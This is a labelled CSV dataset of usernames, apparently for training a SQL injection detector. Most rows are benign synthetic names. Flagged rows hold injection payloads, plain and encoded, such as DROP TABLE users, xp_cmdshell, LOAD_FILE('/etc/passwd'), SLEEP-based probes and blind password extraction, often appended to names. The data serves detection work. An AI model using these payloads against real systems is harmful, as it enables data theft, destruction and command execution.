name,is_malicious
april50,0
%27%3b %44%52%4f%50 %54%41%42%4c%45 %75%73%65%72%73--,1
%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
ralph04,0
csandoval,0
%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
david48,0
nriggs,0
nicole78,0
lesliesmith,0
nwhite,0
jennifer63,0
collinsjames,0
pbrooks,0
glivingston,0
grodriguez,0
' UNION SELECT * FROM users--,1
martinobrien,0
jeremymoss,0
veronicasmith,0
rossalexandra,0
whiteshawn'/**/OR/**/'1'='1,1
scottlee,0
robertsalexander,0
williamsonheather' OR SOUNDEX('test')=SOUNDEX('test')--,1
hernandezcameron,0
camachotiffany,0
jarnold,0
laurie82,0
sean38,0
michaelferguson,0
dmack,0
xhunter,0
esanchez,0
tblack,0
%27 %4f%52 %43%48%41%52%28%34%39%29%3d%43%48%41%52%28%34%39%29--,1
lauren91,0
marc64,0
pbennett,0
zjames,0
fryesharon,0
christopherthomas,0
elizabethwalker,0
0x270x200x4f0x520x200x280x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x280x530x450x4c0x450x430x540x280x530x4c0x450x450x500x280x350x290x290x290x620x410x4b0x4c0x290x2d0x2d,1
romansarah,0
bryantdenise,0
pskinner,0
zmorales,0
rickymaldonado,0
maldonadotammy,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
pamelasullivan,0
' OR CHAR(49)=CHAR(49)--,1
jessica87,0
sonyarivera,0
lisaodonnell,0
amandagonzalez,0
daviessean,0
danielwatts,0
grahamjonathan,0
hjames,0
shester,0
fergusondrew,0
ijones,0
amyfoster,0
ucampbell,0
ryanstark,0
teresa67,0
john11,0
ashley51,0
stephaniescott,0
' OR CHAR(49)=CHAR(49)--,1
0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
kimberlyallen,0
nancy42,0
ljohns,0
michaelaguirre,0
smithphilip,0
troyhamilton,0
shermancassie,0
ogrant,0
dana23,0
david67,0
yorozco,0
audreywatts,0
yangkaren,0
woconnell,0
khensley%27 %4f%52 %28%53%45%4c%45%43%54 %2a %46%52%4f%4d %28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%62%41%4b%4c%29--,1
christopher27,0
wandabooth,0
angelagallagher,0
sara93,0
orrtamara,0
smithmary' UNION SELECT * FROM users--,1
michael25,0
ortizsean,0
danielgonzales,0
garzajennifer,0
jacksonanthony,0
tmccann,0
lopezdylan' OR BINARY 'a'='a'--,1
qlong,0
justin26,0
kevin03,0
williamsalex,0
tatewilliam,0
nataliedavid,0
finleyjason,0
dale88,0
stucker,0
alexmiller,0
christopher79,0
alvarezveronicaCHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
blackwellshannon,0
oprince,0
vincentlin,0
copelandjames,0
klinesheri,0
rmoran,0
davidmiller' OR BINARY 'a'='a'--,1
deborah49,0
robert51,0
jeff73,0
willisstacy,0
"williamsandrea' OR BENCHMARK(10000000,MD5(NOW()))--",1
raymondmiller,0
conniesims,0
hendersonheidi,0
"cassidy21'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
CHAR(39)CHAR(43)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(39)CHAR(48)CHAR(39)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(32)CHAR(87)CHAR(72)CHAR(69)CHAR(82)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(110)CHAR(97)CHAR(109)CHAR(101)CHAR(61)CHAR(39)CHAR(97)CHAR(100)CHAR(109)CHAR(105)CHAR(110)CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(83)CHAR(85)CHAR(66)CHAR(83)CHAR(84)CHAR(82)CHAR(73)CHAR(78)CHAR(71)CHAR(40)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(111)CHAR(114)CHAR(100)CHAR(44)CHAR(49)CHAR(44)CHAR(49)CHAR(41)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(41)CHAR(43)CHAR(39),1
cynthia79,0
susanramirezCHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
meyerspaul,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
elaine27,0
candace77,0
schneiderchristopher,0
todd69,0
jamesmoore'%27%20OR%201=1--,1
alexis40,0
vrodriguez,0
earlhoward,0
fcontreras,0
jhunt,0
uhickman,0
andersondavid,0
edward25,0
tmedina,0
eturner,0
matthew37,0
lindsey33,0
taylorjodi,0
hguerrero,0
joseph27,0
kimberly28,0
%27 %4f%52 %53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29%3d%53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29--,1
william68,0
mariogarner,0
dvasquez,0
paulmills,0
simmonsmichael,0
rachelcarr,0
annewilliams,0
wfernandez,0
charlessmith,0
diana46,0
adammoore,0
kimberly75,0
riostodd,0
philipdyer,0
lparker,0
jeremyking,0
alexisschmidt,0
richard61,0
jonesguy,0
arroyotanya,0
amber53,0
nnelson,0
sanchezlindsey,0
robert38,0
dana14,0
crawfordsteven,0
nicolemitchell,0
vreed,0
christopher79,0
'; EXEC xp_cmdshell('dir')--,1
' OR '1'='1,1
thompsonthomas,0
lopezcurtis,0
denisecampbell,0
vzavala,0
%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
stevenpatterson,0
burgessspencer,0
keithfarrell,0
suarezkimberly,0
morgan90,0
stephaniecunningham,0
davidfisher,0
vcook,0
jeff35,0
yrios,0
karen09,0
mendezmegan,0
denise89,0
ehodge,0
qmorales,0
johnsonpaul,0
patriciacrawford,0
martinbrenda,0
brittanydean,0
michaelayala,0
nicholasward,0
carolyn72,0
fischergregory,0
hectorjoseph,0
bryanfranklin,0
shunter,0
denise81,0
scottmann,0
william42,0
torresmegan,0
sarah58,0
scarrillo,0
jason50,0
andersonsteve,0
ghanson' OR CHAR(49)=CHAR(49)--,1
lopezangela,0
ssmith,0
kennethrodriguez,0
griffinanne,0
' OR '1'='1,1
caitlinrodriguez,0
albert40,0
ymoody,0
davidjackson,0
ugibson,0
ryanreeves,0
iconley,0
amy67,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
estein,0
bfarmer,0
amanda21,0
kelly72,0
thomasjones,0
matkins,0
johnsonhaley' OR 0x50=0x50--,1
vallen,0
joshuawhite,0
michellewright,0
bgomez,0
tommyerickson,0
harrisrandy,0
lrodriguez,0
dsellers,0
christopher22,0
kevin47,0
robincallahan,0
hooverwilliam'%20OR%201=1--,1
rachel11' UNION SELECT * FROM users--,1
vfranklin,0
glen91,0
timothy52' OR BINARY 'a'='a'--,1
shermancindy'%20OR%201=1--,1
parkerrobert,0
michaelwright,0
obennett,0
perezxavier,0
'||'1'='1,1
juan31,0
browncynthia,0
barbaraharding,0
hughesdaniel,0
clinemichael' OR SOUNDEX('test')=SOUNDEX('test')--,1
tayloralexander,0
jerrywagner,0
michaellara,0
farrellmichelle,0
"michael13' OR BENCHMARK(10000000,MD5(NOW()))--",1
john37,0
sherry61,0
hthompson,0
lawrencebarbara,0
jglass,0
parkerruth,0
valenciatommy,0
williamsoncynthia,0
bparks,0
amandachang,0
ushepherd,0
kevin91,0
parkersteve,0
courtney51,0
yhowell'%27%20OR%201=1--,1
stevepierce,0
barrettandrew,0
kwilliams,0
bryantjeremy,0
adamsbilly,0
heather20,0
humphreyvictoria,0
yorkmichaelCHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
michaelzuniga,0
raychelsea,0
gday,0
mitchellronald,0
caguirre,0
jessica76,0
donnazimmerman,0
lisawhitehead,0
davishaley,0
margaret57,0
0x270x200x4f0x520x200x300x780x350x300x3d0x300x780x350x300x2d0x2d,1
nolantina,0
jeffreychandler,0
eyoung,0
april41,0
tammywilson,0
deniseburgess,0
harry51,0
kelly19,0
wscott,0
timothystevens,0
edwardsjohn,0
adam48,0
andrewdillon,0
connie22' OR CHAR(49)=CHAR(49)--,1
jeff87,0
laracarrie,0
petersondaniel,0
' OR CHAR(49)=CHAR(49)--,1
christiandunn,0
keith62,0
christinamoore,0
james61,0
mosleykevin,0
joshuabell,0
cindy30,0
michellehanna,0
quinnwilliam,0
christopherbrown,0
matthew31,0
pwebb,0
jphillips0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
jamiefrench,0
"watsonrobert'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
charles42,0
jenniferdiaz,0
heidigomez,0
"bushjanet' OR BENCHMARK(10000000,MD5(NOW()))--",1
%27 %4f%52 %42%49%4e%41%52%59 %27%61%27%3d%27%61%27--,1
amberlam,0
nicholssean,0
ncooper,0
rvelazquez'/**/OR/**/'1'='1,1
laurasanchez,0
vanessasmith,0
"torresjanet' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
kharris,0
simonsarah,0
flewis,0
mayermark,0
kcooper,0
awilcox,0
jbell,0
emily30,0
flowersmelissa,0
stephanie02,0
caldwellbrent,0
christopherkent,0
conniegriffith,0
amy68,0
joshuabryan,0
' OR 1=1--,1
eugenemoss,0
mosesmarc,0
meganrichardson,0
kennedybrian,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
david80,0
williamsmith,0
thomas71,0
jmiller,0
karen46,0
nolanelizabeth,0
sandra67,0
williamsjerry,0
robert39,0
cookdavid,0
gary75'; DROP TABLE users--,1
linda33,0
harmonjohn,0
' OR CHAR(49)=CHAR(49)--,1
dguerra,0
joshuacabrera,0
wigginsamanda,0
drogers,0
%27 %4f%52 %27%31%27%3d%27%31,1
angelgardner,0
laurie86,0
millergregory,0
rwolfe,0
qmartin,0
morrisrobert,0
sancheztodd,0
christina21,0
nicolemiller,0
michelle82,0
' OR BINARY 'a'='a'--,1
cunninghameric,0
volson,0
miguelwilson,0
costapatrick,0
kthompson,0
julia01,0
alisonashley,0
andrewsamanda,0
michaeljohnson,0
clandry,0
brucehall,0
ryan15,0
fshields,0
fischerbryan,0
jessica34,0
luis99'; EXEC xp_cmdshell('dir')--,1
ramosanna,0
douglas51,0
serranoelizabeth,0
wardjulie,0
samanthacarrillo,0
dianedavies,0
ublack,0
paula91,0
nlarson' OR 1=1--,1
christopherbarnett,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
sean07,0
gary86,0
wrightjamie,0
lisa31,0
rodriguezkyle,0
john53,0
rebecca24,0
charlesrodriguez0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
williamlivingston,0
brandonthomas,0
brivera,0
rmorales,0
barrycantu' OR 1=1--,1
montgomerychristopher,0
gary67,0
davidmaldonado,0
perry120x270x7c0x7c0x270x310x270x3d0x270x31,1
' OR CHAR(49)=CHAR(49)--,1
keithalexander,0
martinezjoseph,0
ashley43' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
lori19,0
cynthiarodriguez,0
jameshull'||'1'='1,1
alvinjones,0
ysanchez,0
"samantha13'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
whitneypage,0
"grodriguez'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
lambtravis,0
bthomas,0
heatherwoods,0
jeremy80'||'1'='1,1
smcclure,0
boydzachary,0
mejiatiffany,0
imontgomery,0
allison14,0
"rachelscott' OR BENCHMARK(10000000,MD5(NOW()))--",1
nicolemayo,0
kingzachary,0
amanda66,0
jennifer22,0
ylewis,0
holtpatricia,0
valvarez,0
englishheather,0
"ralph79' OR BENCHMARK(10000000,MD5(NOW()))--",1
ascott,0
andrew37' OR CHAR(49)=CHAR(49)--,1
loveheidi,0
jamie63,0
"lwhitney'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
diamondthompson' OR '1'='1,1
william66,0
emartin,0
timothy61,0
rachel60,0
yjordan,0
amanda05,0
vstewart,0
leahmccann,0
qcraig,0
yhughes,0
ricky05,0
joshuadavis,0
apage,0
brian19,0
uking,0
seth32,0
jackolson,0
christinabrown,0
christina06,0
sheilaray,0
tammygood'%20OR%201=1--,1
tlopez,0
travisware,0
norriscassandra'; DROP TABLE users--,1
uyates,0
mcarlson,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
rachelpatel' OR CHAR(49)=CHAR(49)--,1
'||'1'='1,1
conniehorn,0
susanthompson,0
0x270x200x4f0x520x200x270x310x270x3d0x270x31,1
dennis07,0
tracie05,0
CHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
rachel47,0
cameronramirez,0
maryfreeman,0
ldickerson,0
ashley35,0
tcastaneda,0
mgordon,0
salexander,0
mitchellandrea,0
whitejason,0
lauren44,0
katherine71,0
thomas41,0
ychristian,0
robert48,0
ashley37,0
treynolds,0
'%20OR%201=1--,1
carpentermelissa,0
jefferygomez,0
anthonyfaulkner,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(61)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(45)CHAR(45),1
ybenson,0
xjimenez,0
dustin80,0
jameslivingston,0
oatkinson,0
vjackson,0
jennifersimmons,0
allengarcia,0
kelly63' OR CHAR(49)=CHAR(49)--,1
carlbell,0
elizabethmedina' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
markbaker,0
melissawilliams,0
gregory00,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
macdonaldpatricia,0
mccoylauren,0
patrickconner' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
cassiejuarez,0
jerrystewart,0
kathyclark,0
jarvisjustin,0
dwarner,0
amanda45,0
rnorman,0
msullivan,0
robinsondeborah,0
whitneyjohnson' OR SOUNDEX('test')=SOUNDEX('test')--,1
'; EXEC xp_cmdshell('dir')--,1
%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
josephschroeder,0
brett56,0
xtorres,0
huynhkathleen,0
jasonwilliams,0
shelia27,0
lori02,0
leejoshua,0
priceveronica,0
anthonypruitt,0
ashleyharris,0
sarahelliott,0
maxwelldavid,0
rebekahthomas,0
estradadustin,0
pfarrell,0
andrew04,0
diana24,0
browningcatherine,0
seth60,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
joanna97,0
grimesrebekah,0
lhowell,0
dominic06,0
david92,0
fordpatricia,0
brookskenneth0x270x7c0x7c0x270x310x270x3d0x270x31,1
erinwilliams,0
crivera,0
kevin17,0
jeffery68,0
deansmith,0
cgreen,0
bobbyharris,0
mcmillanalexis' OR BINARY 'a'='a'--,1
mcguiremichael,0
woodardjason,0
'%20OR%201=1--,1
cathy70,0
vpeterson,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
robertmccarthy,0
jason90,0
drichardson,0
laurawheeler,0
fyoung,0
claytonamy,0
edwardschristopher,0
anthony70,0
beardshelby,0
lisaleach,0
kristensharp,0
haroldsmith,0
brianross,0
mstewart,0
' OR CHAR(49)=CHAR(49)--,1
ohodges,0
erinthompson,0
imcmillan,0
stevenjuarez' OR 1=1--,1
smithdiana,0
mbean%27 %55%4e%49%4f%4e %53%45%4c%45%43%54 %2a %46%52%4f%4d %75%73%65%72%73--,1
jeffrey23,0
stacey81,0
%27 %4f%52 %27%31%27%3d%27%31,1
daymichael,0
ericchapman,0
stephanie16,0
paulagordon,0
uward,0
' OR 0x50=0x50--,1
wanderson,0
vfrazier,0
mclaughlinbrian,0
qtorres,0
madison97,0
wball,0
perryeric,0
morsesamantha' OR 1=1--,1
%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
nrodriguez,0
lynn60,0
brian94,0
julie60,0
angelapaulCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
simpsonmarvin0x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
melissawalsh,0
gtaylor%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
gordonjustin,0
karenjimenez,0
shawn28,0
smithjeffery,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
kimberly47,0
osbornemichael,0
steven050x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
james79,0
bryan24,0
%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
michael89,0
imiller,0
jeffreysimmons,0
yorktiffany%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
' OR SOUNDEX('test')=SOUNDEX('test')--,1
williamoneal,0
qbrown'%20OR%201=1--,1
rsweeney,0
zthompson,0
donaldrich,0
riveraangelica,0
bobbyleach,0
'; EXEC xp_cmdshell('dir')--,1
plynch,0
thomas35,0
mkennedy,0
vdean,0
samuelromero,0
millerjessica,0
yjones,0
andersonjennifer,0
bsherman,0
loricummings,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
yschmitt,0
farmerjacqueline,0
ismith,0
caleb18,0
ubishop,0
deanmillerCHAR(39)CHAR(124)CHAR(124)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
cookann,0
david22,0
bmason,0
castillokristin,0
olee,0
jenkinsjeremy,0
qsmith' OR 0x50=0x50--,1
michaelarnold,0
michelleharper,0
manningpatricia,0
adamsjulie,0
damon27,0
barronjoel,0
' OR '1'='1,1
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
nicoleeverett,0
hollygriffin,0
jonathan41,0
' OR 0x50=0x50--,1
jermainefrey,0
luisgraves,0
rossfrancisco,0
william69,0
adamrivera,0
stephanie43,0
'%20OR%201=1--,1
bsanchez,0
cobbrose,0
%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
simpsonbradley,0
pblevins0x270x200x550x4e0x490x4f0x4e0x200x410x4c0x4c0x200x530x450x4c0x450x430x540x200x4c0x4f0x410x440x5f0x460x490x4c0x450x280x270x2f0x650x740x630x2f0x700x610x730x730x770x640x270x290x2d0x2d,1
haneybailey,0
zgreen,0
ynelson,0
parkermatthew,0
kennethward,0
adamking,0
anthony03,0
pjohnson' OR SOUNDEX('test')=SOUNDEX('test')--,1
ebonyholland,0
david19,0
jgay,0
alex16' OR 0x50=0x50--,1
adambrown,0
marklowe,0
johnsondavid,0
fberry'%27%20OR%201=1--,1
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
michaelgonzalez' OR CHAR(49)=CHAR(49)--,1
lknight,0
justindavis,0
garrett10,0
brian69,0
shawnaphillips,0
dmurphy,0
schmidtrussell,0
brent96,0
prestonblair,0
leegerald,0
jjones%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
mackcory,0
phyllismurray,0
reedkenneth,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
taylorjoshua,0
carlsontammy,0
fscott,0
davidjohnston,0
kevin76,0
amandarogers,0
fergusonmelissa,0
hlee,0
lhahn,0
adamdouglas,0
johnhunter,0
currystacy,0
rlopez,0
khoover,0
gregory60,0
courtneybrown,0
james44,0
diazchristine,0
lfranco,0
matthewfisher,0
parkermegan,0
grossrobert,0
davidsmith,0
brianjohnson,0
terri59,0
sadams,0
barbara03,0
kelseymurray,0
jessica21,0
dhammond,0
guerrerocheyenne,0
michael09,0
qhenry,0
abigail28'||'1'='1,1
%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
nathanwiley,0
oevans,0
' UNION SELECT * FROM users--,1
alexislopez,0
bshaffer,0
smithkelly,0
aprilkidd,0
' OR BINARY 'a'='a'--,1
ellislauren,0
ellisamanda'/**/OR/**/'1'='1,1
cmcdonald,0
hesterdavid,0
jperkins,0
nfields,0
monroepatricia,0
harperchristine,0
tony47,0
xsexton,0
fostermichael,0
andradegeorge,0
james60,0
ofinley,0
candersen,0
laurenbennett,0
gonzalesedward,0
johncabrera,0
"christinesmith'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
victorkhan,0
victoria71,0
fhouse,0
jimenezlarry' OR 1=1--,1
vhancock,0
hgonzalezCHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
valerievargas,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
vlam,0
wallsmichael,0
nathanflores0x270x3b0x200x450x580x450x430x200x780x700x5f0x630x6d0x640x730x680x650x6c0x6c0x280x270x640x690x720x270x290x2d0x2d,1
robbinsashley,0
madisondaniel,0
samanthascott,0
armstrongmelissa,0
skelley,0
"tcastillo' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
angela66,0
qgibbs' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
xmoon,0
russosteve,0
amandamedina,0
walterhumphrey,0
abrown,0
jeremiah86,0
jessicajohnson,0
vincent88,0
nporter,0
suzannefrederick,0
' OR CHAR(49)=CHAR(49)--,1
nathantorres,0
'%27%20OR%201=1--,1
kenneth27,0
trevor77,0
williamssabrina,0
lindseymclean' UNION SELECT * FROM users--,1
'%27%20OR%201=1--,1
valdezjeremy,0
fergusonjacob,0
vanderson,0
hho,0
laurenparks,0
elizabethhouse,0
nguyenian,0
matthew50,0
craig16,0
zbush,0
wdaniels,0
wstephens,0
fosborne,0
obaker,0
parkerraymond,0
desiree74,0
lisabarber,0
briannahansen,0
mark49,0
howardlarry,0
'; EXEC xp_cmdshell('dir')--,1
christina93%27 %4f%52 %42%49%4e%41%52%59 %27%61%27%3d%27%61%27--,1
nmiles,0
donaldcervantes,0
wchristensen,0
aprilwolfe,0
cochrannicholas,0
ghart,0
stephaniekelly,0
shawn07,0
estewart,0
carrie52,0
david92,0
amy78,0
cmiddleton,0
mirandabrown,0
rosemelissa,0
thoward,0
%27 %4f%52 %42%45%4e%43%48%4d%41%52%4b%28%31%30%30%30%30%30%30%30%2c%4d%44%35%28%4e%4f%57%28%29%29%29--,1
alexa56,0
smartinez,0
susan91,0
velezjulia,0
barbarasmith' OR SOUNDEX('test')=SOUNDEX('test')--,1
michellemurphy,0
moorejoseph,0
dwoodard,0
zwalton'; DROP TABLE users--,1
brianhayes,0
alexandragarcia,0
stephanielee,0
herringlisa' OR SOUNDEX('test')=SOUNDEX('test')--,1
zchan,0
gregory59,0
'; EXEC xp_cmdshell('dir')--,1
karen55,0
'; DROP TABLE users--,1
samuel30,0
taylorlatasha,0
gregory62,0
alexanderashley,0
vsmith,0
' OR CHAR(49)=CHAR(49)--,1
christophermiller,0
stephenmiller,0
adam13,0
lorraine09'; EXEC xp_cmdshell('dir')--,1
aortega,0
johnbarnes,0
carriestout,0
samuel84,0
zacharyphillips,0
bankspamela,0
pmedina,0
cthompson,0
owensalexandria,0
tpatel,0
byrdjustin,0
jesusforbes,0
btyler,0
woodjames,0
evanslogan,0
gjohnson%27 %4f%52 %42%45%4e%43%48%4d%41%52%4b%28%31%30%30%30%30%30%30%30%2c%4d%44%35%28%4e%4f%57%28%29%29%29--,1
mcdonaldnancy,0
estradaaaron,0
ehayes,0
'/**/OR/**/'1'='1,1
goodmanmichael,0
'; DROP TABLE users--,1
daniel29,0
denise35%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
danasmith' OR '1'='1,1
fboyd,0
jeremy23,0
cookjeffrey,0
dorothy22,0
qsmith,0
zgordon,0
vanessa12,0
penacharles'; EXEC xp_cmdshell('dir')--,1
